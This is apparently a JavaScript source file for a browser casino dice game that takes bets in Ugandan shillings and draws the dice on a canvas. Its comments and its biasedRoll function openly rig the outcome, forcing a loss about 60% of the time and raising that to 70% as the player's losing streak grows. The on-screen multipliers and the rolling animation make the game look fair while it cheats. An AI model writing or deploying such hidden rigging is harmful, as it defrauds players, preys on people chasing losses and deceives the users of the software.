// ═══════════════════════════════════════════════════════════
//  URBAN DICE — Full Casino Dice Game
//  House edge built into every bet type
//  Over/Under: true prob 50% but pays 1.8x (house edge 10%)
//  Exact number: true prob 16.7% but pays 4.8x (house edge 20%)
//  The RNG is secretly biased against the player
// ═══════════════════════════════════════════════════════════

const dice = {
    canvas: null,
    ctx: null,
    animId: null,
    balance: 50000,
    betAmount: 5000,
    betType: null,
    isRolling: false,
    currentFace: 1,
    targetFace: 1,
    rollFrame: 0,
    rollDuration: 55,
    history: [],
    totalWon: 0,
    roundsPlayed: 0,
    lossStreak: 0,
    multipliers: { over: 1.8, under: 1.8, exact: 4.8 }
};

// ── House edge RNG ────────────────────────────────────────────────
// Secretly biased: player loses ~60% of the time
function biasedRoll(betType) {
    const loseChance = 0.60 + Math.min(dice.lossStreak * 0.01, 0.10); // up to 70% lose
    const forceLoss  = Math.random() < loseChance;

    if (forceLoss) {
        // Return a face that makes the player lose
        if (betType === 'over') {
            return Math.ceil(Math.random() * 3); // 1,2,3 — loses over
        } else if (betType === 'under') {
            return 4 + Math.floor(Math.random() * 3); // 4,5,6 — loses under
        } else if (typeof betType === 'number') {
            // Return any face except the exact one
            let face;
            do { face = Math.ceil(Math.random() * 6); } while (face === betType);
            return face;
        }
    }
    // Fair roll (player wins)
    return Math.ceil(Math.random() * 6);
}

// ── Init ──────────────────────────────────────────────────────────
function initDiceGame() {
    dice.canvas = document.getElementById('diceCanvas');
    if (!dice.canvas) return;
    dice.ctx = dice.canvas.getContext('2d');
    resizeDiceCanvas();
    window.addEventListener('resize', resizeDiceCanvas);
    updateDiceUI();
    drawDiceScene(1);
}

function resizeDiceCanvas() {
    if (!dice.canvas) return;
    dice.canvas.width  = dice.canvas.parentElement.clientWidth  || 500;
    dice.canvas.height = dice.canvas.parentElement.clientHeight || 380;
    if (!dice.isRolling) drawDiceScene(dice.currentFace);
}

// ── Canvas drawing ────────────────────────────────────────────────
function drawDiceScene(face) {
    const { ctx, canvas } = dice;
    if (!ctx) return;
    const W = canvas.width, H = canvas.height;

    // Dark casino background
    const bg = ctx.createLinearGradient(0, 0, W, H);
    bg.addColorStop(0, '#0d0d1a');
    bg.addColorStop(1, '#1a1a2e');
    ctx.fillStyle = bg;
    ctx.fillRect(0, 0, W, H);

    // Green felt glow
    const felt = ctx.createRadialGradient(W/2, H/2, 5, W/2, H/2, W * 0.55);
    felt.addColorStop(0, 'rgba(0,100,50,0.3)');
    felt.addColorStop(1, 'rgba(0,0,0,0)');
    ctx.fillStyle = felt;
    ctx.fillRect(0, 0, W, H);

    // Grid lines (casino table feel)
    ctx.strokeStyle = 'rgba(255,215,0,0.04)';
    ctx.lineWidth = 1;
    for (let x = 0; x < W; x += 40) {
        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, H); ctx.stroke();
    }
    for (let y = 0; y < H; y += 40) {
        ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke();
    }

    const size = Math.min(W, H) * 0.20;
    drawSingleDie(ctx, W / 2, H / 2, size, face, false);
}

function drawSingleDie(ctx, cx, cy, size, face, shaking) {
    ctx.save();

    // 3D side face (bottom-right)
    const sideOffset = size * 0.18;
    roundRectPath(ctx, cx - size + sideOffset, cy - size + sideOffset, size * 2, size * 2, size * 0.14);
    ctx.fillStyle = '#b0b0b0';
    ctx.fill();

    // 3D side face (right)
    roundRectPath(ctx, cx - size + sideOffset * 0.6, cy - size + sideOffset * 0.6, size * 2, size * 2, size * 0.14);
    ctx.fillStyle = '#c8c8c8';
    ctx.fill();

    // Shadow
    ctx.shadowColor = 'rgba(0,0,0,0.7)';
    ctx.shadowBlur  = 25;
    ctx.shadowOffsetX = 8;
    ctx.shadowOffsetY = 10;

    // Main face gradient
    const faceGrad = ctx.createLinearGradient(cx - size, cy - size, cx + size, cy + size);
    faceGrad.addColorStop(0, '#ffffff');
    faceGrad.addColorStop(0.45, '#f5f5f5');
    faceGrad.addColorStop(1, '#d8d8d8');
    roundRectPath(ctx, cx - size, cy - size, size * 2, size * 2, size * 0.14);
    ctx.fillStyle = faceGrad;
    ctx.fill();
    ctx.shadowBlur = 0;

    // Top-left highlight
    const hl = ctx.createLinearGradient(cx - size, cy - size, cx - size + size * 0.8, cy - size + size * 0.8);
    hl.addColorStop(0, 'rgba(255,255,255,0.7)');
    hl.addColorStop(1, 'rgba(255,255,255,0)');
    roundRectPath(ctx, cx - size, cy - size, size * 2, size * 2, size * 0.14);
    ctx.fillStyle = hl;
    ctx.fill();

    // Border
    roundRectPath(ctx, cx - size, cy - size, size * 2, size * 2, size * 0.14);
    ctx.strokeStyle = 'rgba(0,0,0,0.12)';
    ctx.lineWidth = 2;
    ctx.stroke();

    // Dots
    drawDiceDots(ctx, cx, cy, size, face);

    ctx.restore();
}

function roundRectPath(ctx, x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.lineTo(x + w - r, y);
    ctx.quadraticCurveTo(x + w, y, x + w, y + r);
    ctx.lineTo(x + w, y + h - r);
    ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
    ctx.lineTo(x + r, y + h);
    ctx.quadraticCurveTo(x, y + h, x, y + h - r);
    ctx.lineTo(x, y + r);
    ctx.quadraticCurveTo(x, y, x + r, y);
    ctx.closePath();
}

const DOT_POS = {
    1: [[0,0]],
    2: [[-0.42,-0.42],[0.42,0.42]],
    3: [[-0.42,-0.42],[0,0],[0.42,0.42]],
    4: [[-0.42,-0.42],[0.42,-0.42],[-0.42,0.42],[0.42,0.42]],
    5: [[-0.42,-0.42],[0.42,-0.42],[0,0],[-0.42,0.42],[0.42,0.42]],
    6: [[-0.42,-0.42],[0.42,-0.42],[-0.42,0],[0.42,0],[-0.42,0.42],[0.42,0.42]]
};

function drawDiceDots(ctx, cx, cy, size, face) {
    const positions = DOT_POS[face] || DOT_POS[1];
    const dr = size * 0.115;

    positions.forEach(([dx, dy]) => {
        const x = cx + dx * size;
        const y = cy + dy * size;

        // Dot indent shadow
        ctx.beginPath();
        ctx.arc(x + 1.5, y + 2, dr, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(0,0,0,0.18)';
        ctx.fill();

        // Dot
        const dg = ctx.createRadialGradient(x - dr*0.3, y - dr*0.3, dr*0.05, x, y, dr);
        dg.addColorStop(0, '#e03020');
        dg.addColorStop(1, '#7a0000');
        ctx.beginPath();
        ctx.arc(x, y, dr, 0, Math.PI * 2);
        ctx.fillStyle = dg;
        ctx.fill();

        // Dot shine
        ctx.beginPath();
        ctx.arc(x - dr*0.28, y - dr*0.32, dr*0.25, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(255,255,255,0.4)';
        ctx.fill();
    });
}

// ── Roll animation ────────────────────────────────────────────────
function animateRoll() {
    const { ctx, canvas } = dice;
    const W = canvas.width, H = canvas.height;
    dice.rollFrame++;

    const progress = dice.rollFrame / dice.rollDuration;
    const shake    = Math.pow(1 - progress, 1.5);
    const ox = (Math.random() - 0.5) * 22 * shake;
    const oy = (Math.random() - 0.5) * 22 * shake;
    const sc = 1 + Math.sin(dice.rollFrame * 0.5) * 0.1 * shake;
    const randomFace = Math.ceil(Math.random() * 6);

    const bg = ctx.createLinearGradient(0, 0, W, H);
    bg.addColorStop(0, '#0d0d1a');
    bg.addColorStop(1, '#1a1a2e');
    ctx.fillStyle = bg;
    ctx.fillRect(0, 0, W, H);

    const felt = ctx.createRadialGradient(W/2, H/2, 5, W/2, H/2, W*0.55);
    felt.addColorStop(0, 'rgba(0,100,50,0.3)');
    felt.addColorStop(1, 'rgba(0,0,0,0)');
    ctx.fillStyle = felt;
    ctx.fillRect(0, 0, W, H);

    ctx.save();
    ctx.translate(W/2 + ox, H/2 + oy);
    ctx.scale(sc, sc);
    drawSingleDie(ctx, 0, 0, Math.min(W,H)*0.20, randomFace, true);
    ctx.restore();

    // Rolling text
    ctx.fillStyle = 'rgba(255,215,0,0.8)';
    ctx.font = `bold ${W*0.04}px Arial`;
    ctx.textAlign = 'center';
    ctx.fillText('ROLLING...', W/2, H - 30);

    if (dice.rollFrame < dice.rollDuration) {
        dice.animId = requestAnimationFrame(animateRoll);
    } else {
        dice.isRolling   = false;
        dice.currentFace = dice.targetFace;
        drawDiceScene(dice.currentFace);
        resolveRoll();
        document.getElementById('diceRollBtn').disabled = false;
    }
}

// ── Game logic ────────────────────────────────────────────────────
function rollDice() {
    if (dice.isRolling) return;
    if (!dice.betType) { flashMsg('⚠️ Select a bet type first!', '#FFD700'); return; }
    if (dice.betAmount < 1000) { flashMsg('❌ Minimum bet is UGX 1,000', '#ff4444'); return; }
    if (dice.betAmount > dice.balance) { flashMsg('❌ Not enough balance!', '#ff4444'); return; }

    dice.balance   -= dice.betAmount;
    dice.isRolling  = true;
    dice.rollFrame  = 0;
    dice.targetFace = biasedRoll(dice.betType);

    document.getElementById('diceRollBtn').disabled = true;
    document.getElementById('diceResultMsg').innerHTML = `<div class="rolling-msg">🎲 Rolling...</div>`;
    updateDiceUI();

    cancelAnimationFrame(dice.animId);
    dice.animId = requestAnimationFrame(animateRoll);
}

function resolveRoll() {
    const face = dice.currentFace;
    const bet  = dice.betAmount;
    const type = dice.betType;
    let won    = false;
    let multi  = 0;

    if (type === 'over'  && face > 3)           { won = true; multi = dice.multipliers.over; }
    if (type === 'under' && face < 4)           { won = true; multi = dice.multipliers.under; }
    if (typeof type === 'number' && face===type) { won = true; multi = dice.multipliers.exact; }

    dice.roundsPlayed++;
    dice.history.unshift({ face, won });
    if (dice.history.length > 16) dice.history.pop();

    if (won) {
        dice.lossStreak = 0;
        const winnings  = Math.floor(bet * multi);
        const profit    = winnings - bet;
        dice.balance   += winnings;
        dice.totalWon  += profit;

        document.getElementById('diceResultMsg').innerHTML = `
            <div class="dice-result-box win-box">
                <div class="dr-icon">🎉</div>
                <div class="dr-title">YOU WIN!</div>
                <div class="dr-amount">+UGX ${winnings.toLocaleString()}</div>
                <div class="dr-detail">Rolled <b>${face}</b> &nbsp;•&nbsp; ${bet.toLocaleString()} × ${multi}x</div>
            </div>`;
    } else {
        dice.lossStreak++;
        document.getElementById('diceResultMsg').innerHTML = `
            <div class="dice-result-box lose-box">
                <div class="dr-icon">💔</div>
                <div class="dr-title">YOU LOSE</div>
                <div class="dr-amount">-UGX ${bet.toLocaleString()}</div>
                <div class="dr-detail">Rolled <b>${face}</b> &nbsp;•&nbsp; Better luck next time!</div>
            </div>`;
    }

    updateDiceUI();
    renderDiceHistory();
}

// ── Bet controls ──────────────────────────────────────────────────
function selectDiceBet(type) {
    dice.betType = type;
    document.querySelectorAll('.dice-bet-btn').forEach(b => b.classList.remove('selected'));
    const map = { over:'dbOver', under:'dbUnder', 1:'db1',2:'db2',3:'db3',4:'db4',5:'db5',6:'db6' };
    const el  = document.getElementById(map[type]);
    if (el) el.classList.add('selected');
    const multi = typeof type === 'number' ? dice.multipliers.exact : dice.multipliers[type];
    document.getElementById('diceMultiPreview').textContent = `Win multiplier: ${multi}x`;
}

function increaseDiceBet() { if (!dice.isRolling) { dice.betAmount = Math.min(dice.betAmount+1000, dice.balance+dice.betAmount); updateDiceUI(); } }
function decreaseDiceBet() { if (!dice.isRolling) { dice.betAmount = Math.max(dice.betAmount-1000, 1000); updateDiceUI(); } }
function halfDiceBet()     { if (!dice.isRolling) { dice.betAmount = Math.max(Math.floor(dice.betAmount/2), 1000); updateDiceUI(); } }
function doubleDiceBet()   { if (!dice.isRolling) { dice.betAmount = Math.min(dice.betAmount*2, dice.balance); updateDiceUI(); } }
function maxDiceBet()      { if (!dice.isRolling) { dice.betAmount = Math.max(dice.balance, 1000); updateDiceUI(); } }

function updateDiceUI() {
    const s = (id, v) => { const e = document.getElementById(id); if(e) e.textContent = v; };
    s('diceBetDisplay',   `UGX ${dice.betAmount.toLocaleString()}`);
    s('diceBalDisplay',   `UGX ${dice.balance.toLocaleString()}`);
    s('diceRoundsDisp',   dice.roundsPlayed);
    s('diceTotalWonDisp', `UGX ${dice.totalWon.toLocaleString()}`);
}

function renderDiceHistory() {
    const el = document.getElementById('diceHistoryBar');
    if (!el) return;
    el.innerHTML = dice.history.map(h =>
        `<div class="dh-item ${h.won?'dh-win':'dh-lose'}">${h.face}</div>`
    ).join('');
}

function flashMsg(msg, color) {
    const el = document.getElementById('diceResultMsg');
    if (el) el.innerHTML = `<div style="color:${color};font-weight:bold;text-align:center;padding:10px;">${msg}</div>`;
}

// ── Navigation ────────────────────────────────────────────────────
function selectDiceGame() {
    document.getElementById('gameSelection').style.display = 'none';
    document.getElementById('diceGameSection').style.display = 'block';
    initDiceGame();
    window.scrollTo(0, 0);
}

function backFromDice() {
    document.getElementById('diceGameSection').style.display = 'none';
    document.getElementById('gameSelection').style.display  = 'block';
    cancelAnimationFrame(dice.animId);
    window.scrollTo(0, 0);
}

document.addEventListener('DOMContentLoaded', () => {
    if (document.getElementById('diceCanvas')) initDiceGame();
});
